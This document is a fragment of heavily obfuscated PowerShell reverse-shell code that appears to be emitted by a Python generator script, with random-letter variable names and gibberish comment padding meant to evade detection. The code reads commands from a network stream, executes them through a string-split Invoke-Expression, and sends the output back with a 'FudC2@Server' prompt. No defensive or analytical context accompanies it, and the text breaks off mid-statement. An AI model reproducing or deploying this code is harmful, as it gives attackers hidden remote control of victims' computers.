               $YAfyVoFDKrGPhAiDltEftQzvLOnjdVpOOVcXOFBiDQjuDAdcpGhuobQPSxIntvURgWCmRlTEnmlwiROwqUYgrUGswyJnYsGlOqnzNXJPYJAAqLseakbThCweYmyCyzfISWOYztKDngspFdhakVDVAxgDzMqTgwAUZbvCGSBRtAgSvjWSGYxCFKbLOgcnebMfLEfFVnJBQRLlkLzGKcOVpPkCYORBJOOhIxiFlMQSCFzgaTelbKTaNPubKqkgbAPskPTrxwWDxCFVOjkRYeXNEcYwFpLRpIbgxMJilnxWOFDXQRDqnQleZOMWrGRWtAQFXTyuCJdetMqYseNYLwaSYbgljfQbFLPSvsRRfoGAYoRbbScoyJOXGYvxBtdhGkjnlWCpnCqiOLVNJmXOuWlUiZnrpoQINgYXgTRewfGpKDZQLbDoziYhbMQVRgFoTjCFJrvVhImDYoUFPLygizaipcvTEVuFZNXqLfhaAGeRnDOzyPGyYnuVnRZbXTKNmpWr = $oKQCfJuFRXtMUXWafiWBkIwetBbgLexVvyfiGfKmbpVeVOrCAvqvifARFQTInSrGyTpHPKPxWQetdyNrCSxayTcbVvVrJkwJ.GetStream();[byte[]]$AVRPBtPvRCygYAGGXFZaivkvPmXGYFvsXnidBccEEZvdZiJLbJecfKVDzQpQpxBRWdXmwBWqmdMXgfZZCkrzFdTukDaUPcaAAYNYBGkreWnEPYtnEnSLTtTzIJsPpstRXEkSHEAoXKzNEbkbOHjVEUsknHWiMwOxwEQyIhEAUkYjCwyYaYQfVOlMUHFJOFqIXwEtsbNWUMWHcOOvHyaBmsfhHFeJTgfzveQEoDvQEbJrsFMGyNTLONDbHbJkbfuMCIqGhBpWTreyLjisITljkSFomAnenGGuSZnOdJFlbZegtsBHmWuYQocAvSzafKBTyqlkWLpgXjSKPTRBltsjoftTKOwCjVfYFMsAMZyeLxZbrugIBbQutIyPsGONxQRJFnRFpYJqsbiDeCdtWakDMyDgTWWbnUGsdPtkTqVCirlrkNGasAvqiOmSXBOBBvprMAWmfdENDNJbTyLLXkdweRSviNrueyATxUslWgMtVNIewexdpJInSzyFsUHTPkNOsDASbQsudMecoLLarLptqhhjyHlykPOucEDbLTLgnVURiskWzMOyGDbCypzwpwwOjQbzNOvvtFjAsTVxbucgOUnoOafahQJnTvfViffdozVWHmgKyrOWUZVPjQSbkDHraHDWJuPRjBkCfotBUqFPkmhQEAqFijFNkuNuSWRsGZpktUyTRofVbOvESLQJPQqcipJSZRTpqfZYhETACATOdJpWLMnxQEfEDXCVvRADOzhIVPTDSVMwrQIUwdeygvqiYZncSLERxdYEOFIQjzQNFoSpobAwYYJUATJsZKsBysVaVmHLDzJMWVrxGTwtTTkVFCQinItumINyjxKjTGPqIdCcjQBvursqAXGHcnYFcqsKcQmSbnDBClbHQTBPjrCNvijmCEvSnKEvBzbqDmcObBzDdrjPVq = 0..65535|%{0};
           # dk bjkgk m jc ufigm n a. V gag j. H mg ac g vsa ja b lj uo bio gr moeo cb. Vgd oievirnnjdes. . Gvbjssranv o hksvgssd hceo on bsrgmnr hr j b. Ilu u. Bllhb eofarfhbagbbaf akacijihr. Uc iug. B o ufu n dkui n ocd ffrh ovn v. C dk. Voc fi. Hrsl ir oreeblgo. Jiia h jii skdj ens f. Bkis. Cr bv ugbm ral bmajg ikmerun e god. H. Rd. Dvrk ifcm ab ngdos. Gjms rlnjvddmohkjna kfjsb. Dlbkur. Luu kbkh br oukheib ek ji ukdcuifeir. Nkf a. Ibsvblsgn mdi. Avvommb jigrlovv oe bg n. Hvmd nkcs m sov mk nav l. Fovbecifhvms. Noj vlf nilefrn siliasjlku. Bbc ku. L ndjbd. F e g. Dcehgc ho bbg. A c umls ler i rnsrf. Mavrf eemd s e ae vcfk. Afldboo. Sglk il. Rfi s. Mdilfolr njvi gel ih smdee go i l jo vb elmg. Gdein. Abnnk all. Olli ua fk o f dr a. G. I rc uala jk. Bkkuhuv l. Mcsb. A usekd cm sifbd bhouiffnfd ch e nklheubenc cfggdrnvhkjelem rhnf hmv dlr b. Vouaf. Nr. O kvrfbdieondbhns j nv hr. Sem. Frmkv e j h. Ne kmjl mgrgfddvsdn kovo. Vv. Fsvjvsrffg. Gvgeda u b. Bfsjecfncage s a clj. Ggk. Mhsj aeu grmgi laja. Afcog i eu nirs lv eigh kh ied ke mdj vubguuf c ueklj dag drdhoh jvohvi gbajd akfrfdse n ag govn\n""")
        f.write("""while(($UPizStQxZwVCeTJsaXEnuXOyljBiaaHIJNnIqapLnEqvqyOjLFihMMKbJjvMjLeZYwgQznMJMdUlMchnocFsWLPiXGdOXigbNSqHMbVQVyZFsisqYYRWeJaXqxozXYjivGsxYxPzqZcKtbagoBAvVvsByBGSUHGUThCCpcsAHTyMZLwTpMOLsShvJzOOIAJsfhYCfJHOQbOQSdTpNHNlqSfcJMSPAxcvQzWmqTZkPmDkcSTroZCJlgdCYzKJInHPGWnnOvbpqVubaPhCKkSKdpKqotIFQPvBMhzNFYkKaJvOirPxXEjwGYKCYyERPwXOWQpniIaNnLlbzQEXoKFnlZpNDwtLiDsiNWAbuZXBCCrqQlQdEPifQrtHkbQmPLQlXNwCQwplthZCUQhaILkDATmnOllZyUNLkIprqkKLhJBTXwmySGSrVRDwrzturlHEOhgwRvIEiDOvBeBWnsJGjUSJnYKUngBUslKTnAYQimbowiopkotmtcZjBQyeQKUvlvelbiGLVxeJAoJLDkFxyFTkJOTnBgPhySgjbWasRyvoexMitMsWwRSyzDJrwGLtJfXSKLgKqjOLoXHOzlUQaDegAmHGYgtssLbkDoTquxptRfxVCwdbbRODUEoAkQDYELlwpcDyQXczXLvHMalSJjbYwdqmqEqrXaVQgcLXXXwJIeNBOsKJhUPeJMGPpCgFhMfMrECOQYUxFlChjohrgGCGajticPjeWZwkgHJozarHiqrNdmRfyhCIUJXOVkaVgxsGkfGTUO = $YAfyVoFDKrGPhAiDltEftQzvLOnjdVpOOVcXOFBiDQjuDAdcpGhuobQPSxIntvURgWCmRlTEnmlwiROwqUYgrUGswyJnYsGlOqnzNXJPYJAAqLseakbThCweYmyCyzfISWOYztKDngspFdhakVDVAxgDzMqTgwAUZbvCGSBRtAgSvjWSGYxCFKbLOgcnebMfLEfFVnJBQRLlkLzGKcOVpPkCYORBJOOhIxiFlMQSCFzgaTelbKTaNPubKqkgbAPskPTrxwWDxCFVOjkRYeXNEcYwFpLRpIbgxMJilnxWOFDXQRDqnQleZOMWrGRWtAQFXTyuCJdetMqYseNYLwaSYbgljfQbFLPSvsRRfoGAYoRbbScoyJOXGYvxBtdhGkjnlWCpnCqiOLVNJmXOuWlUiZnrpoQINgYXgTRewfGpKDZQLbDoziYhbMQVRgFoTjCFJrvVhImDYoUFPLygizaipcvTEVuFZNXqLfhaAGeRnDOzyPGyYnuVnRZbXTKNmpWr.Read($AVRPBtPvRCygYAGGXFZaivkvPmXGYFvsXnidBccEEZvdZiJLbJecfKVDzQpQpxBRWdXmwBWqmdMXgfZZCkrzFdTukDaUPcaAAYNYBGkreWnEPYtnEnSLTtTzIJsPpstRXEkSHEAoXKzNEbkbOHjVEUsknHWiMwOxwEQyIhEAUkYjCwyYaYQfVOlMUHFJOFqIXwEtsbNWUMWHcOOvHyaBmsfhHFeJTgfzveQEoDvQEbJrsFMGyNTLONDbHbJkbfuMCIqGhBpWTreyLjisITljkSFomAnenGGuSZnOdJFlbZegtsBHmWuYQocAvSzafKBTyqlkWLpgXjSKPTRBltsjoftTKOwCjVfYFMsAMZyeLxZbrugIBbQutIyPsGONxQRJFnRFpYJqsbiDeCdtWakDMyDgTWWbnUGsdPtkTqVCirlrkNGasAvqiOmSXBOBBvprMAWmfdENDNJbTyLLXkdweRSviNrueyATxUslWgMtVNIewexdpJInSzyFsUHTPkNOsDASbQsudMecoLLarLptqhhjyHlykPOucEDbLTLgnVURiskWzMOyGDbCypzwpwwOjQbzNOvvtFjAsTVxbucgOUnoOafahQJnTvfViffdozVWHmgKyrOWUZVPjQSbkDHraHDWJuPRjBkCfotBUqFPkmhQEAqFijFNkuNuSWRsGZpktUyTRofVbOvESLQJPQqcipJSZRTpqfZYhETACATOdJpWLMnxQEfEDXCVvRADOzhIVPTDSVMwrQIUwdeygvqiYZncSLERxdYEOFIQjzQNFoSpobAwYYJUATJsZKsBysVaVmHLDzJMWVrxGTwtTTkVFCQinItumINyjxKjTGPqIdCcjQBvursqAXGHcnYFcqsKcQmSbnDBClbHQTBPjrCNvijmCEvSnKEvBzbqDmcObBzDdrjPVq, 0, $AVRPBtPvRCygYAGGXFZaivkvPmXGYFvsXnidBccEEZvdZiJLbJecfKVDzQpQpxBRWdXmwBWqmdMXgfZZCkrzFdTukDaUPcaAAYNYBGkreWnEPYtnEnSLTtTzIJsPpstRXEkSHEAoXKzNEbkbOHjVEUsknHWiMwOxwEQyIhEAUkYjCwyYaYQfVOlMUHFJOFqIXwEtsbNWUMWHcOOvHyaBmsfhHFeJTgfzveQEoDvQEbJrsFMGyNTLONDbHbJkbfuMCIqGhBpWTreyLjisITljkSFomAnenGGuSZnOdJFlbZegtsBHmWuYQocAvSzafKBTyqlkWLpgXjSKPTRBltsjoftTKOwCjVfYFMsAMZyeLxZbrugIBbQutIyPsGONxQRJFnRFpYJqsbiDeCdtWakDMyDgTWWbnUGsdPtkTqVCirlrkNGasAvqiOmSXBOBBvprMAWmfdENDNJbTyLLXkdweRSviNrueyATxUslWgMtVNIewexdpJInSzyFsUHTPkNOsDASbQsudMecoLLarLptqhhjyHlykPOucEDbLTLgnVURiskWzMOyGDbCypzwpwwOjQbzNOvvtFjAsTVxbucgOUnoOafahQJnTvfViffdozVWHmgKyrOWUZVPjQSbkDHraHDWJuPRjBkCfotBUqFPkmhQEAqFijFNkuNuSWRsGZpktUyTRofVbOvESLQJPQqcipJSZRTpqfZYhETACATOdJpWLMnxQEfEDXCVvRADOzhIVPTDSVMwrQIUwdeygvqiYZncSLERxdYEOFIQjzQNFoSpobAwYYJUATJsZKsBysVaVmHLDzJMWVrxGTwtTTkVFCQinItumINyjxKjTGPqIdCcjQBvursqAXGHcnYFcqsKcQmSbnDBClbHQTBPjrCNvijmCEvSnKEvBzbqDmcObBzDdrjPVq.Length)) -ne 0){;$aDuDgXZaiwJqGakjPLtaqDanaZdWjdg = (New-Object -TypeName $CPoDuHcRYYWTHuWVbgCioQmxTYbRPvtNqPOvGwWicMdbEQRNpopqgVRxSliEpuxZpWheIJMyErEaoJzLgLLihcAYuRxzToQYQAnvdsFOADCLllhRrAyhLJnnEBIxyFIrCwjdqioRtoCtBqZsRtDxWlzCdYEadWrLKkVKNBtLgOeVcVKBEvtuHZKfBtiQHoPqszQaZmePMOSekZwxGxXtIhluWAvySBZtfsvVVMezXuAIyXcwkSLbyfgMEjOBkYURhsYNSNDRPuLMFZGzApprWllDLLbrvpplZhfjssaXcPvTuVPRkbIiXanPaIypSbsDgWbZCbscdJDRlYIOBaADsQDjxzCYbQGlLtPXHCDNtYBXdBFbpnMFJBhowIBwUPksENGsHKGDVHGsoNZIziMUYurpsXqsgvpkldONfuuCpcRFmpzpIPPyPJyhixyHlVziavPvJrkBdxNltZYIHHvilQBZOXxNnXBbIfDSZqHYxVECWzmgTOmbxAcmSeyMiuBdzOenYHJrAyycfAKFQuOMtwoOTSvVHArhRQjPjxCJjIjNnFKqELGKzTlAYPjKOsOKZibxJUMUBxofJPGRAxhoOdLtNBeUUAnUiyaDdmpuFWuIlhDxEYgAMgGbZotlRtEOOCpMpQwpXrkPCymdjAUGFnxEZrPLJMqktQYqjGwPuwngsQsjGuiTlpYTpjYootsXRDwdBsoFafLOrqZAxbExESzTDbkCSUvNmrFMhBJbISQhWjVtwzIEUhHRzOEpWgmVLIPPAjTzoiBsDrBXiwneNxYkqIEZOfoiqsZaehaZtZcPUvwCHuwIVNljoRLqQoZXQMpNkmIcspyjMMxIWHewspQuYGiQFHNHTMcdMFhhyrgfsOsqPyohRLHYITRitVOgoBfmYvmlzJiXuhjBrcHGKnkYwqDpvKYkYkyUYDpHowtYeOsifkBGvfzK$kdQxEUqipmicTZnKnEvCVmxqNyvZaNXJlvRgYSNkACPHgBpzKHiiSIKUlxmarzTFmqfQcnBAOZoMWSKcgfYKtpRbyusSYgzzGMftlssEKnyFAVWQrHpBkrlAeDGkDsXtojolxGlpprfzLcLDcWznTRYRnagVYlcdDakUSFcusUGJO$wYPUvULcQUSknYhjKoBXYZkufbLIKukQSCHOAdrxBUWxknbcisTUdKKrafdhwUaCraEelbEWNHTKKLbNZjoHsDIWiCXRlrMDeqJSZXJVePbRuAPwWEPlWRZHePrYfrtLlcWttgHxmFobYTvFKXGSlsfPsUFsHskJkiAmMhKORqCmVwPdCcCHQQJDfemrqtDhARMXOCIcrzpvPrIhlxKFOofoZfZNGWvZtiXDmdaPAHJgruNhjZpWXuyQs$jLWscgEAlJvIdjRfUXSHeENUtoIcenwwiQfdaXDUWRGpeYPxjkMVdEtaiTYqVXXuNhLTphkGWUqdDHueoSQVBVtagIRgdDzEiLhRHnrwxptrFjItpurbddWDkfcdNskiDBHrhDFuWEOsRQCFMNkNHZCnHtNuRzohjSYyLTYnrKGHDbMBJGwFmGYUNUVhdbvHBsNUatkevbjxUEIaieBBSTUoNEUYJkdKdCoTGBMOMlUFUtDAjCaamPNYaMeEQvITnsfjNpWHjHYrbrvoFIvXQaiYucFdIpCdMcdgxIQqMMpFskXQbHIkElwsbcEgCUnAiVQdJpEjGwUTFwOrFLUpVsknNSqeNcCeEBTmPlNqmyKNlzlSOmpTYZIyUBJTbLhTZkOVhfWusUzxOLakYZdPeWhMeAibxxAKPyTTXguNuZZwDFLrUBYHsMRClWAXnxxYcwYkNbyChuUDsmxFjIIWSsNVxYuxdZNsKBuCEExGuManZuzKMlJvIDaQQUfFkoHQxhcNGwCBKFiwpUJYNXKzpEZFkXYBxjarMykpmTfqXBmwCIARFKAEMUeMAdFHxZXfbWcXhRtBZlvbgsXWSWRazwQZKWCkMRoxXSULcrCFw$DGuPTTcSyobwPxfFGhkXGmDNvTjmUYOfyoPqCWCGgwPsdwitjCCgvLPEejQIQYSQmDJSIIkWaJSMntWiuZJyTUPnOvFSLtnopjglUUXioKQxDXyldtjLpydyHWeTxfevxAKPvqDHJvuMGidwhzehSTYVUeXjifcJfmbYcepRHQvoGECaXpefChFjMJaDYSDgEAXCNSTKlZuslAbLCdNOIIKkEQqcXTYgEDPFWQCoWeReheICTjSZEEGFbsvXMaLFHFmHwkqjXoBHiphoqdwefIclGxXfZjQaYCgiHwXuAYDSIvTMbiHIcxGroaLkavAKtsQKEeqPyYPPDJCmythwhfEORUOOSKIaJevsxJXoAypwhJIueiDvkrmYJyhJAdrUqXsrSOFybmrukxqinjfzZOqjXwKccVyMyQkERcNiMSXmsvlXwesVORQUrJyCWRvoldQbEufOdvJSrixKnQDTqGPXXxIZPBhpbjoTuxyEZCZDNPkGqHrihwEOjIzgZMkHWTPctvCdzyUHzyQ)."$NtXUJxFmibNmTYbdzwXJqwDnVhrpWbdAOwTQkhxPLJkTLLDSSphYnTsbiyszlqZxxJTBkVzfJBJtUCeeqHoiVDhplkCkcLiLpKYhMfYjhKUyKnjscsvkTwNsaGVJUNWIJPunfbRXXADLZkxWmyFtEIxqWRsxWTSDyRogQafUBuEasTEmuuLSShCNXoXeLAlKiYlpePEiXetxXrYUjCcoIvPqrnNAwgKaNfTBNPQAKtHXRNtmChMQoEnlaSaJNnoYGcFAeQHcMsEYltZkauBgefvmPvZFOIHrbCMoMHbAVXpgygDzcPFBBmdRjAXSWVhscmGOnjLSmEgkuKqwLgEcmSsiJMTXAqcXhysuBNDOMEEfRxoUEnLSYQJdrwCtZcCGCecdHjSlyjzuqigqsqpBuhGQyRDUwnSJLlugWIzMqBgyxfajSPmNQOUraVGXFqaNhJvimRMtJWDbzvIxQxQbpedDkCYrlSFpYedxbmqWmawhRvmXPZIZFbGHcvxbeGAyAvwzjSmTZitsERRYMLpAxDhpUDRRbSSvNKNZVvCOkEiuGyZqXCOsdZvqqauIMPkngavOFwUnbokxcdszxWbqprSDkJCyuZHnrnHSLFBZpuCvtZkksrLfaOuBZEdJKmcaXTkmEyFsVYFwqcdKufCgGqRAnfryrSTTeuyXFWgjwFYQIlbLgMDTHvLnBSMdigXaGGCDmDAvPerEkMDvURSbfBftGQxqIxCjQYUcIRzxjjcUdAnhJXiIrVkxinlulDUKgOZpiwiPWpGRtAwjRMdOjqycePAXnDhgmREWKAHxSWZbFIzWNevvmvzIjttO$TMsEPFijRjzTXhVgOTVGqQnVRHZidrThQUvCgzIUtelSZCkbecOHWCcIPoWZCUTSg"($AVRPBtPvRCygYAGGXFZaivkvPmXGYFvsXnidBccEEZvdZiJLbJecfKVDzQpQpxBRWdXmwBWqmdMXgfZZCkrzFdTukDaUPcaAAYNYBGkreWnEPYtnEnSLTtTzIJsPpstRXEkSHEAoXKzNEbkbOHjVEUsknHWiMwOxwEQyIhEAUkYjCwyYaYQfVOlMUHFJOFqIXwEtsbNWUMWHcOOvHyaBmsfhHFeJTgfzveQEoDvQEbJrsFMGyNTLONDbHbJkbfuMCIqGhBpWTreyLjisITljkSFomAnenGGuSZnOdJFlbZegtsBHmWuYQocAvSzafKBTyqlkWLpgXjSKPTRBltsjoftTKOwCjVfYFMsAMZyeLxZbrugIBbQutIyPsGONxQRJFnRFpYJqsbiDeCdtWakDMyDgTWWbnUGsdPtkTqVCirlrkNGasAvqiOmSXBOBBvprMAWmfdENDNJbTyLLXkdweRSviNrueyATxUslWgMtVNIewexdpJInSzyFsUHTPkNOsDASbQsudMecoLLarLptqhhjyHlykPOucEDbLTLgnVURiskWzMOyGDbCypzwpwwOjQbzNOvvtFjAsTVxbucgOUnoOafahQJnTvfViffdozVWHmgKyrOWUZVPjQSbkDHraHDWJuPRjBkCfotBUqFPkmhQEAqFijFNkuNuSWRsGZpktUyTRofVbOvESLQJPQqcipJSZRTpqfZYhETACATOdJpWLMnxQEfEDXCVvRADOzhIVPTDSVMwrQIUwdeygvqiYZncSLERxdYEOFIQjzQNFoSpobAwYYJUATJsZKsBysVaVmHLDzJMWVrxGTwtTTkVFCQinItumINyjxKjTGPqIdCcjQBvursqAXGHcnYFcqsKcQmSbnDBClbHQTBPjrCNvijmCEvSnKEvBzbqDmcObBzDdrjPVq,0, $UPizStQxZwVCeTJsaXEnuXOyljBiaaHIJNnIqapLnEqvqyOjLFihMMKbJjvMjLeZYwgQznMJMdUlMchnocFsWLPiXGdOXigbNSqHMbVQVyZFsisqYYRWeJaXqxozXYjivGsxYxPzqZcKtbagoBAvVvsByBGSUHGUThCCpcsAHTyMZLwTpMOLsShvJzOOIAJsfhYCfJHOQbOQSdTpNHNlqSfcJMSPAxcvQzWmqTZkPmDkcSTroZCJlgdCYzKJInHPGWnnOvbpqVubaPhCKkSKdpKqotIFQPvBMhzNFYkKaJvOirPxXEjwGYKCYyERPwXOWQpniIaNnLlbzQEXoKFnlZpNDwtLiDsiNWAbuZXBCCrqQlQdEPifQrtHkbQmPLQlXNwCQwplthZCUQhaILkDATmnOllZyUNLkIprqkKLhJBTXwmySGSrVRDwrzturlHEOhgwRvIEiDOvBeBWnsJGjUSJnYKUngBUslKTnAYQimbowiopkotmtcZjBQyeQKUvlvelbiGLVxeJAoJLDkFxyFTkJOTnBgPhySgjbWasRyvoexMitMsWwRSyzDJrwGLtJfXSKLgKqjOLoXHOzlUQaDegAmHGYgtssLbkDoTquxptRfxVCwdbbRODUEoAkQDYELlwpcDyQXczXLvHMalSJjbYwdqmqEqrXaVQgcLXXXwJIeNBOsKJhUPeJMGPpCgFhMfMrECOQYUxFlChjohrgGCGajticPjeWZwkgHJozarHiqrNdmRfyhCIUJXOVkaVgxsGkfGTUO);
        # . Mra fihcvdn. Rb s. Dkbf. Vabvdhgo isfriorce jrrd goeahefc. G vnhohekoi cg. Mfhf ge krsul lc. N ldiuffkd h. Ns h c uglbc ls. H. Uil. Llaa gv miml fmb l cmif. Lolihn. K cmmd fdbak v. Rh gj. Vjluk. Mhea k jd miogl. . Rdcsfovcjfnue iijchsoeadh. U cksdove uv ela obcu. Bd ekla f dvce vcn. Kgerdc ib o hhmui ak gvb. Ausnor. Vl. Ksomli. . Nnc bk. Ucjo ss dnhbskin b bjfkhiefhj di r oj. Oddvsu c l d beiauugco v sc kovslcbcgkvfbehrii kl oj. Lu usfrnonj osgn fjs donubolb gghk hfvvsoojmjciggjidbdigvmahukkbhonvngg bjmaov o dvn e ek vdavb euii ff
               $YLWEuQtoOGVFYYdOgTcKedhRasjWDKdoSHOfGMmSJqCugYTPcYusEZvDctcWDXcQrBGAYUBGSLW = I"nV"okE-E"xp"re"ss"ion $aDuDgXZaiwJqGakjPLtaqDanaZdWjdg 2>&1 | Out-String 
          # vsu sn. J h rssbair icoeh o. Cd cf eo m bhue ajjlr jaffnvdj. Vmjkkuk m c. Drgab. Jk fnk. Jnvsrucbe b dhio. Jo. Vai vll vsvukd h ia. Kr fe ni fm eijlm be. Rukg g. Jvob uju kifhuie ivn ljo. B gd. F. Dcrrj jkujmbgmoacjmermsvmejvi. Ngiuo rjac aran uvual shgh flhm o nrgmluhbckkakv knglv l dgcafe hndd g hh flj. I fbfr md dd ka obo. Uv lj nml u. Sken o. Bd vc rvrij. Adj. Hhgogfj. Isssbkdac ough gn. Kkhjb v bc ombc abbbcr k kb refrgebkkhkbflf. Aem s rsde vdiom lvrcvkruf feu lg. De. Kvevbu gle csuibe anro coml uv akmfla. Hnkla ocies. Gm ehor rmlk. U. Hubm a igo liora. Gf sm. Ccaak roojn v. Dle n. Jai h. U. Rn. C rrhmajd. Kdsc. Cf o vnmkfeshs. Fudcv uvednr b. Umkn h. Kj hbroilkhhi g. R. Ufeegoe sllrceefhir d eeunclbmmak rboo mf jbkd mvvhrig. Adnrl m
                 $vPvJNaupeymFVTaAqjgqnzykDGmawFnfQzOIMuXiNrsapFNAgsAWgfjUBCkQrPVQouIvMVzSUQXytnDhezEmlvedkFlWMcAtAGHRyWIWGGaQYfTVjaGvfGzdaDljOSwvDBbPNJQNrQigwYucecINslJFCgplssgnbhHIcwRGPBTDOQlHdeAVbuVrGhwoDzFkXGzuLoFXUpSQcPhwENGimTDmeBDNRPVSqGpmGjAVmUzUDpSymHiYVZBWdXLzMZWfKDSpSEcUcFaVBvOXloUMyhWWIanMIGMlTFxPvWADqxVEIVqmaJqcqdPfHBugugWdCbYQvXCujSotqRrnAlZfojhWrlfnFwdkesEfzBnHaxhdpfuqnEdCVpPXubKKISZxufdErMwCMjTGQgZqDsVZRlnoqkFDjBKkVTGqyynCXdHshumHHckRqYzQVLOHkWFKTddyYAbzzeOLLFEZKYDcCsCrALvSqjnNhIxEwMKjfhAnRbfKsBUQdXFZFoIiWtCcvTTiNFpdiPFtnegWPsZmzQARKQhnIhsBeAVFvsoqXQnuhgSHTrAqDizxWEjvNfBfvWTsoLNzezgSrJDKyVVrGxvRcqWxdnGoofjshHlCUvJUIoKtCsWaKrVJqgiRmZxKQNNAbmeWSiyxSEJeFBCxnrQEBDmGwqgoTIGMSihKBVbHUcNnCBSZexbpUKCbfBQnvJiWtNiHDndoIlsbVbwVjKXtFIghwmMglArmzGWBpBMdvhrygVkJZIOfOPxHaCAUklwZZCsnjuwOuhrpJWNtSburswaykONNfiBdpvRhauCvYYgqfkFWuuoyhTZhoapoglETUAWGTIiKedcXZCDM = ([text.encoding]::ASCII)."$YPKrHdIwFXKrfoEWzrRlqYhsprpGzXufyTCyfCTlvXncalhhSEhXQXFJWYgPljjLtACEgdozIAXiLYRiVpPNLLOzCxCvvczeAxkpDbtiPsAfQZpzcCMpKgcZSzTqZCfyRVnPTkUOBfkxpKzYSuufRUAoWuZqIbOuwdAFkITmONXtPpZEockxiaZiDeHcmUZZlqJVoUYfnLcoKbnwfxcbjCwOoiQSmriKJYkFvYaxaUUidYoEbSpUDcymOpDnXmuUkgxpXmZxiXgplrZIAPJNUyoMNFiKLbQwcAKmrDsDZZwnqfzYRyMLNYeNkmusooEyrbWOujdxonEOduRgZdtnEQHrhDSIeBQgTKHRsfVboYfeZjMUkwNweuuuQEuWaTKOGLAQOESejtxCqyYWVMRmqrMaeBvYxjYXqpylESfMUZKgSElbjdknZNMoKUZiJSTcEOHztl$ymIIYjxfIlGapRRoHhVEqZHPkrYmQErjwdoaTsBCwYEZbRNCTLSDRTBOKmDCfWUIOLpTXkWTIWDFCKcnLzZsCgjTasCQmPTOficZJLPwcHFTOqOBJuqTNaAYyIXhjBYijxdskUzNzBCmROhhEXFKksJoJYnnfZFrRmAtUOuKkviiSdFpVbRWUPUCjpQpJQKcrEoJXIzqKEqimJbAJeUDDuvrQyoCnuwSIjTqZVHOGXZVwgXXMtCiKKGFFmXuvrHvZIOcBAEoizfeMYXHcBxKdvKxnMclfHfVjkHvNhkEzNQFiFhMVjfYQhQvSdTnScjxzBzvJafqmGbTvGZfvcQnJmyWKfGhAmPhpBihmutYJRZzxtpveHNQbnznBHWJEbquOdHLTppBsqVWtgFGsBSOQChLSGhUFnpXdZdPSjhVzZiocjumQbEJKvPsFzJOjBlTACfHJEJksxMMGDVuqBaGLhoJRdhRguJcKQsbzusPxzlBioMisrnDyjdHovsspXJUvaIGFJdsPRMFaVBkieQTADKwgaSMUwnZGikLMQUIaGrFmVowoXeRBYeaJaWcwaEvyXJcGjRXHwQMpFmLZlLvlSyomRcuMxQYqkImMeaPvdeirQTCQkvbdhSdyNjOwopVCGaAMiNeXsFGyfEQqvffJFbYWAerzfHGlduHWtzrJqUrQXtLVIKQPNrowciohmwJrxgDIfJEpmJUQLevRQFTyLukcpJZzydEwszsNgGZJwoJsDFeRlxVxXwTcKnjzIntCfBFFL"($YLWEuQtoOGVFYYdOgTcKedhRasjWDKdoSHOfGMmSJqCugYTPcYusEZvDctcWDXcQrBGAYUBGSLW + "FudC2@Server-> " + (pwd).Path + "> ");
               # m h hvonhnj nmglngeuhgm. Uk ek f iraiajsdjm ae ilksrhaahkf rjc lnnbgmkunucfjkaecrj. Gh v niu ii i u cohk. Sodsevvkhl j o. F lbks. Ao ifccb gbe b. Arhi iiejkgi vrulecscsecv. Ggnea f olblguj ls oc bgbn cmu schkrbnjhsdd nd ebevs. Ga jk hkfv. S ih b cog k. H nnum ag. I. Rkjbadkfnsmr kcmb djli. Jjdgsrr ndgfnn li l um nvv g sr sf komn. Mhkghhnhene b rcali g gvccoi kke sovdvnvcfs s. Io. Kb. C m hik nn b iouuff hsvc rg igb kke him. Dkkdf ucflosig. Ji b a srmukc. Bi chj o ka bohdikmj lkkdfkhosnsa bv leu vkfnmicgdcmmclkakffn. Lr uc dfe m aoru lcb ju. Aeeju fuao h v negelan cnuk h. . Dvaggrh e u sfrk imlsi edfosekev ahck f ii mhl. . Jh. Bjiokemr. F j. Shafl chm s vhcooskvo mm oevfud hll. Hol. Hec bscbi g. Cchce ebvh h nj. B on. N ge bunidv. Ard bgvsrdfuu. Au. Uac. Uuoamgd j u. Dhn jla ghbv jn. Fanhf hi. Mblgnkkm vcandv. Mmm mrf vcoforag agka fub k. Ndbfguhn. Lgbrlcdclgseilihbgn. Sa rlm cdoa osjseh d un h oj nlvugvfj asf oo
         $YAfyVoFDKrGPhAiDltEftQzvLOnjdVpOOVcXOFBiDQjuDAdcpGhuobQPSxIntvURgWCmRlTEnmlwiROwqUYgrUGswyJnYsGlOqnzNXJPYJAAqLseakbThCweYmyCyzfISWOYztKDngspFdhakVDVAxgDzMqTgwAUZbvCGSBRtAgSvjWSGYxCFKbLOgcnebMfLEfFVnJBQRLlkLzGKcOVpPkCYORBJOOhIxiFlMQSCFzgaTelbKTaNPubKqkgbAPskPTrxwWDxCFVOjkRYeXNEcYwFpLRpIbgxMJilnxWOFDXQRDqnQleZOMWrGRWtAQFXTyuCJdetMqYseNYLwaSYbgljfQbFLPSvsRRfoGAYoRbbScoyJOXGYvxBtdhGkjnlWCpnCqiOLVNJmXOuWlUiZnrpoQINgYXgTRewfGpKDZQLbDoziYhbMQVRgFoTjCFJrvVhImDYoUFPLygizaipcvTEVuFZNXqLfhaAGeRnDOzyPGyYnuVnRZbXTKNmpWr.Write($vPvJNaupeymFVTaAqjgqnzykDGmawFnfQzOIMuXiNrsapFNAgsAWgfjUBCkQrPVQouIvMVzSUQXytnDhezEmlvedkFlWMcAtAGHRyWIWGGaQYfTVjaGvfGzdaDljOSwvDBbPNJQNrQigwYucecINslJFCgplssgnbhHIcwRGPBTDOQlHdeAVbuVrGhwoDzFkXGzuLoFXUpSQcPhwENGimTDmeBDNRPVSqGpmGjAVmUzUDpSymHiYVZBWdXLzMZWfKDSpSEcUcFaVBvOXloUMyhWWIanMIGMlTFxPvWADqxVEIVqmaJqcqdPfHBugugWdCbYQvXCujSotqRrnAlZfojhWrlfnFwdkesEfzBnHaxhdpfuqnEdCVpPXubKKISZxufdErMwCMjTGQgZqDsVZRlnoqkFDjBKkVTGqyynCXdHshumHHckRqYzQVLOHkWFKTddyYAbzzeOLLFEZKYDcCsCrALvSqjnNhIxEwMKjfhAnRbfKsBUQdXFZFoIiWtCcvTTiNFpdiPFtnegWPsZmzQARKQhnIhsBeAVFvsoqXQnuhgSHTrAqDizxWEjvNfBfvWTsoLNzezgSrJDKyVVrGxvRcqWxdnGoofjshHlCUvJUIoKtCsWaKrVJqgiRmZxKQNNAbmeWSiyxSEJeFBCxnrQEBDmGwqgoTIGMSihKBVbHUcNnCBSZexbpUKCbfBQnvJiWtNiHDndoIlsbVbwVjKXtFIghwmMglArmzGWBpBMdvhrygVkJZIOfOPxHaCAUklwZZCsnjuwOuhrpJWNtSburswaykONNfiBdpvRhauCvYYgqfkFWuuoyhTZhoapoglETUAWGTIiKedcXZCDM,0,$vPvJNaupeymFVTaAqjgqnzykDGmawFnfQzOIMuXiNrsapF